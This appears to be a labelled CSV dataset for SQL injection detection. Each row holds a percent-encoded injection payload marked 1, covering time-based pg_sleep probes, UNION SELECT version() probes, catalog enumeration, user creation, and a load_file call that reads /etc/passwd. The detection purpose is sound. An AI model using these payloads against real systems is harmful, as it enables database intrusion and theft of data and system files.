Query,Label
%22 o%72 %70g%5f%73%6c%65%65p  %28  _%5ft%69m%65_%5f  %29  -%2d,1
c%72%65a%74%65 u%73%65%72 %6e%61%6de %69%64%65%6e%74%69%66%69%65%64 %62%79 p%61ss123 %74%65%6d%70%6fr%61%72%79 %74a%62%6c%65%73p%61%63%65 %74%65%6d%70 de%66a%75lt %74a%62%6c%65%73p%61%63%65 u%73%65%72s;,1
 %6%31nd %31  %3d  utl_inaddr.%67et_host_address   %28    %28   s%6%35l%6%35c%74 %64%69%73%74%69%6e%63t  %28  %74%61%62%6c%6%35%%35f%6e%61%6d%6%35  %29   %66%72%6f%6d   %28  s%6%35l%6%35c%74 %64%69%73%74%69%6e%63t  %28  %74%61%62%6c%6%35%%35f%6e%61%6d%6%35  %29  %2c r%6fwnu%6d %61s %6cim%69%74 %66%72%6f%6d %73%79%73.%61%6c%6c%%35f%74a%62%6ces  %29   wher%6%35 %6cim%69%74  %3d  %35   %29    %29    %6%31nd '%69'  %3d  %27%69,1
" s%65l%65c%74 %2a f%72%6f%6d %75%73%65%72%73 %77%68%65%72e i%64  %3d  '%31%27 %6f%72 %40 %40%31  %3d  %31 %75%6ei%6f%6e s%65l%65c%74 %31,v%65rs%69on  %28    %29   -%2d %3%31%27",1
" %73%65%6ce%63%74 %2a %66%72%6f%6d us%65r%73 %77%68e%72%65 %69%64  %3d  %3%31 o%72 %3%3%31%23%22  %28   %75n%69o%6e %73%65%6ce%63%74 %3%31,vers%69%6fn  %28    %29   %2d%2d %3%31",1
 %73e%6ce%63t na%6d%65 f%72%6f%6d %73%79s%63olu%6d%6e%73 %77%68%65%72%65 %69%64   %3d     %28  %73e%6ce%63t %69%64 f%72%6f%6d %73%79%73%6f%62%6ae%63%74%73 %77%68%65%72%65 na%6d%65   %3d   tablena%6d%65'  %29  %2d%2d,1
sele%63t %2a %66%72o%6d us%65rs %77%68%65%72%65 i%64  %3d  %3%3%3%31 +%24+ %6f%72 %3%3%3%31  %3d  %3%3%3%31 -%2d %3%3%3%31,1
"%31%3b  %28  %6co%61d_%66i%6c%65  %28  %63%68%61%72  %28  4%37%2c%310%31%2c%311%36,%399%2c%34%37,1%31%32%2c%397%2c%3115%2c%31%31%35%2c%31%31%39,%31%30%30   %29    %29     %29  ,1,1,%31%3b",1
 se%6ce%63%74 %2a %66%72o%6d us%65%72s w%68e%72%65 %69%64  %3d  '%31%27 %6f%72 |%7c%2f%31  %3d  %31 u%6eion se%6ce%63%74 %3%31%2c%76%65r%73%69%6f%6e  %28    %29   %2d- %31%27,1
" %73%65l%65%63%74 %2a fr%6f%6d %75%73%65r%73 w%68e%72%65 %69%64  %3d  %271%27 %6f%72 %5c%2e%3c%5c %75nion %73%65l%65%63%74 %31,@@%76%65%72si%6f%6e %2d%2d %31'",1
